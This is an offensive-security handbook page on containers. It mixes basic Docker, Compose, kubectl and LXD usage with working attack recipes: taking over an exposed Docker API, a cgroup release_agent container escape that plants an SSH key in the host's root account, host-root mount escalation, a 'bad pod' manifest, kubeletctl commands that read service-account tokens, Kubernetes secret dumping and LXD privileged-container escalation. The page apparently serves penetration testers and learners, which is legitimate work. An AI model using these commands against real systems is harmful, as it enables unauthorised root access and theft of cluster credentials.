# Container

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Resources)

## Table of Contents

- [Docker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Docker)
- [Docker-Compose](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Docker-Compose)
- [Kubernetes](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#Kubernetes)
- [LXD](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/container.md#LXD)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Awesome Kubernetes (K8s) Security | A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos. | https://github.com/magnologan/awesome-k8s-security |
| Bad Pods | A collection of manifests that will create pods with elevated privileges. | https://github.com/BishopFox/badPods |
| Break out the Box (BOtB) | A container analysis and exploitation tool for pentesters and engineers. | https://github.com/brompwnie/botb |
| CDK - Zero Dependency Container Penetration Toolkit | Make security testing of K8s, Docker, and Containerd easier. | https://github.com/cdk-team/CDK |
| deepce | Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)  | https://github.com/stealthcopter/deepce |
| Harpoon | A collection of scripts, and tips and tricks for hacking k8s clusters and containers. | https://github.com/ProfessionallyEvil/harpoon |
| Krane | Kubernetes RBAC static analysis & visualisation tool | https://github.com/appvia/krane |
| Kubestriker | A Blazing fast Security Auditing tool for Kubernetes. | https://github.com/vchinnipilli/kubestriker |
| Peirates | Peirates - Kubernetes Penetration Testing tool | https://github.com/inguardians/peirates |
| ThreatMapper | Open source cloud native security observability platform. Linux, K8s, AWS Fargate and more. | https://github.com/deepfence/ThreatMapper |

## Docker

### Basic Commands

```c
$ docker pull <IMAGE>                  // pull image
$ docker pull <IMAGE>:latest           // pull image with latest version
$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
$ docker image ls                      // list images
$ docker image rm <IMAGE>              // remove image
$ docker image rm <IMAGE>:latest       // remove image with latest version
$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
$ docker run --name <IMAGE>            // use a memorable name
$ docker run -it <IMAGE> /bin/bash     // interact with image
$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
$ docker run -d <IMAGE>                // run image in background
$ docker run -p 80:80 <IMAGE>          // bind port on the host
$ docker ps                            // list running containers
$ docker ps -a                         // list all containers
$ docker stop <ID>                     // stops a specific container
$ docker rm <ID>                       // delete a specific container
$ docker exec -it <ID> /bin/bash       // enter a running container
```

```c
$ docker -H <RHOST>:2375 info
$ docker -H <RHOST>:2375 images
$ docker -H <RHOST>:2375 version
$ docker -H <RHOST>:2375 ps -a
$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
```

### Dockerfiles

- FROM       // build from a specific base image
- RUN        // execute command in the container within a new layer
- COPY       // copy files from the host filesystem
- WORKDIR    // set the root file system of the container
- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
- EXPOSE     // publishes a port in the users context

#### Example Dockerfile

```c
# Example Dockerfile
FROM ubuntu:22.04

# Set working directory
WORKDIR /

# Create a file inside of the root directory
RUN touch <FILE>

# Perform updates
RUN apt-get update -y

# Install apache2
RUN apt-get install apache2 -y

# Expose port 80/TCP
EXPOSE 80

# Start the service
CMD ["apache2ctl", "-D","FOREGROUND"]
```

#### Build Example Dockerfile

```c
$ docker build -t <NAME> .
$ docker run -d --name <NAME> -p 80:80 <NAME>
```

### Attacking Docker API

```c
$ docker -H <RHOST>:2375 ps -a
CONTAINER ID   IMAGE     COMMAND                  CREATED        STATUS                    PORTS     NAMES
01ca084c69b7   alpine    "chroot /host bash -…"   11 hours ago   Exited (2) 11 hours ago             zealous_blackburn
```

```c
$ docker -H <RHOST>:2375 commit 01ca084c69b7
sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac

Initial CONTAINER ID: 01ca084c69b7
New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
New CONTAINER ID:     aa02ba520ac9
```

```c
$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Container Escape by exploiting cgroups

#### Requirements

* Already root inside a container
* The container must be run with the SYS_ADMIN Linux capability
* The container must lack an AppArmor profile, or otherwise allow the mount syscall
* The cgroup v1 virtual filesystem must be mounted read-write inside the container

#### Vulnerability Indicator Flag

```c
--security-opt apparmor=unconfined --cap-add=SYS_ADMIN
```

#### Script

```c
mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/exploit/release_agent

echo '#!/bin/sh' > /cmd
echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
```

### Privilege Escalation

```c
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
```
  
## Docker-Compose

### Basic Commands

```c
$ docker-compose up       // (re)create/build and start containers specified in the compose file
$ docker-compose start    // start specific containers from compose file
$ docker-compose down     // stop and delete containers from the compose file
$ docker-compose stop     // stop (not delete) containers from the compose file
$ docker-compose build    // build (not start) containers from the compose file
```

### Create Networks and run Containers

```c
$ docker network create <NETWORK>
$ docker run -p 80:80 --name <NAME> --net <NETWORK> <NAME>
$ docker run --name <NAME> --net <NETWORK> <NAME>
$ docker-compose up
```

### docker-compose.yml Files

| Instruction | Explanation | Example |
| --- | --- | --- |
| version | Placed on top of the file to identify the version of docker-compose the file is written for. | 3.3 |
| services | Marks the beginning of the containers to be managed. | services: |
| name | Define the container and its configuration. | webserver |
| build | Defines the directory containing the Dockerfile for this container/service. | ./<NAME> |
| ports | Publishes ports to the exposed ports (this depends on the image/Dockerfile). | '80:80' |
| volumes | Lists the directories that should be mounted into the container from the host operating system. | './home/<USERNAME>/webserver/:/var/www/html' |
| environment | Pass environment variables (not secure), i.e. passwords, usernames, timezone configurations, etc. | MYSQL_ROOT_PASSWORD=<PASSWORD> |
| image | Defines what image the container should be built with. | mysql:latest |
| networks | Defines what networks the containers will be a part of. Containers can be part of multiple networks. | <NETWORK> |

#### Example docker-compose.yml

```c
version: '3.3'
services:
  web:
    build: ./web
    networks:
      - <NETWORK>
    ports:
      - '80:80'


  database:
    image: mysql:latest
    networks:
      - <NETWORK>
    environment:
      - MYSQL_DATABASE=<DATABASE>
      - MYSQL_USERNAME=root
      - MYSQL_ROOT_PASSWORD=<PASSWORD>
    
networks:
  <NETWORK>:
```

## kubectl

### Installation

> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

```c
$ sudo apt-get update && sudo apt-get install -y apt-transport-https
$ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
$ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
$ sudo apt-get update
$ sudo apt-get install -y kubectl
```

### Checking Capabilities

```c
$ export token="<TOKEN>"
$ kubectl --token=$token --certificate-authority=<CERTIFICATE> --server=https://<RHOST>:8443 auth can-i --list
```

### Bad Pod Example YAML

```c
apiVersion: v1
kind: Pod
metadata:
  name: badpod
  namespace: default
spec:
  containers:
  - name: badpod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

### Deployment

```c
$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 apply -f badpod.yaml
```

### Checking Pod Status

```c
$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 get pods
```

## kubeletctl

> https://github.com/cyberark/kubeletctl

```c
$ kubeletctl pods -s <RHOST>
$ kubeletctl runningpods -s <RHOST>
$ kubeletctl runningpods -s <RHOST> | jq -c '.items[].metadata | [.name, .namespace]'
$ kubeletctl -s <RHOST> scan rce
$ kubeletctl -s <RHOST> exec "id" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "/bin/bash" -p <POD> -c <CONTAINER>
$ kubeletctl -s <RHOST> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER>
```

## Kubernetes

### API RBAC Attack

```c
$ kubectl get namespaces
$ kubectl get pods --all-namespaces -o wide
$ kubectl get pods -n <NAMESPACE>
$ kubectl describe pod <POD_ID> -n <NAMESPACE>
$ kubectl -n <NAMESPACE> --token=<TOKEN> auth can-i --list
$ kubectl get secrets -n <NAMESPACE>
$ kubectl describe secrets/<SECRET> -n <NAMESPACE>
$ kubectl --token=<TOKEN> cluster-info
$ kubectl --token=<TOKEN> auth can-i create pod
$ kubectl create -f <BADPOD>.yaml --token=<TOKEN>
```

## LXD

> https://github.com/saghul/lxd-alpine-builder

### Privilege Escalation

```c
$ sudo ./build-alpine
```

or

```c
$ sudo ./build-alpine -a i686
```

### Configuration

```c
$ lxd init
```

### Settings

```c
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

### Starting

```c
$ lxc launch ubuntu:18.04
```

### Import

```c
$ lxc image import ./alpine-v3.12-x86_64-20200622_0953.tar.gz --alias foobar
```

### Status

```c
$ lxc image list
```

### Security Parameters

```c
$ lxc init foobar ignite -c security.privileged=true
```

### Set mount Options

```c
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

### Starting Image

```c
$ lxc start ignite
```

### Enter Image

```c
$ lxc exec ignite /bin/sh
```
